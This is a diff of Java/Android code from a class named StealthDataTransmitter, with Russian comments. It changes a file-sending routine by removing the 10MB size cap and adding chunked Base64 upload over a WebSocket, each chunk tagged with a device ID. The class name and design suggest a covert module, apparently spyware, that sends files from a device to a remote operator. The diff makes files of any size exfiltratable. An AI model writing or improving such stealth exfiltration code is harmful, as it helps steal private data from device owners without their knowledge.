@@ -231,7 +231,7 @@ public class StealthDataTransmitter {
         }
     }
 
-    private static final long MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB max
+    private static final int CHUNK_SIZE = 256 * 1024; // 256KB на чанк — баланс скорости и памяти
 
     public void sendFile(String filePath) {
         try {
@@ -241,34 +241,47 @@ public class StealthDataTransmitter {
                 return;
             }
 
-            // Bug #10: Проверка размера файла
-            if (file.length() > MAX_FILE_SIZE) {
-                Log.e(TAG, "File too large: " + file.length() + " bytes (max " + MAX_FILE_SIZE + ")");
-                return;
+            long fileSize = file.length();
+            int totalChunks = Math.max(1, (int) Math.ceil((double) fileSize / CHUNK_SIZE));
+            String fileId = java.util.UUID.randomUUID().toString();
+
+            Log.d(TAG, "Sending file in " + totalChunks + " chunks: " + file.getName() + " (" + fileSize + " bytes)");
+
+            try (java.io.FileInputStream fis = new java.io.FileInputStream(file)) {
+                byte[] buffer = new byte[CHUNK_SIZE];
+                int bytesRead;
+                int chunkIndex = 0;
+
+                while ((bytesRead = fis.read(buffer)) != -1) {
+                    byte[] chunk = (bytesRead == CHUNK_SIZE)
+                            ? buffer
+                            : java.util.Arrays.copyOf(buffer, bytesRead);
+
+                    String base64Chunk = android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP);
+
+                    JSONObject message = new JSONObject();
+                    message.put("type", "file_chunk");
+                    message.put("device_id", currentDeviceId);
+                    message.put("file_id", fileId);
+                    message.put("filename", file.getName());
+                    message.put("chunk_index", chunkIndex);
+                    message.put("total_chunks", totalChunks);
+                    message.put("total_size", fileSize);
+                    message.put("data", base64Chunk);
+
+                    if (webSocket != null && isConnected()) {
+                        webSocket.send(message.toString());
+                    } else {
+                        Log.w(TAG, "WebSocket disconnected during file send, aborting");
+                        break;
+                    }
+
+                    chunkIndex++;
+                    try { Thread.sleep(15); } catch (InterruptedException ignored) {}
+                }
             }
 
-            // A6: try-with-resources для гарантированного закрытия
-            byte[] fileData;
-            try (java.io.DataInputStream dis = new java.io.DataInputStream(new java.io.FileInputStream(file))) {
-                fileData = new byte[(int) file.length()];
-                dis.readFully(fileData);
-            }
-
-            String base64Data = android.util.Base64.encodeToString(fileData, android.util.Base64.NO_WRAP);
-
-            JSONObject message = new JSONObject();
-            message.put("type", "file_download");
-            message.put("device_id", currentDeviceId);
-            message.put("filename", file.getName());
-            message.put("data", base64Data);
-            message.put("size", file.length());
-            message.put("timestamp", System.currentTimeMillis());
-
-            if (webSocket != null && isConnected()) {
-                webSocket.send(message.toString());
-                Log.d(TAG, "File sent: " + file.getName() + " (" + file.length() + " bytes)");
-            }
-
+            Log.d(TAG, "File transfer complete: " + file.getName() + " (" + totalChunks + " chunks)");
         } catch (Exception e) {
             Log.e(TAG, "Failed to send file", e);
         }
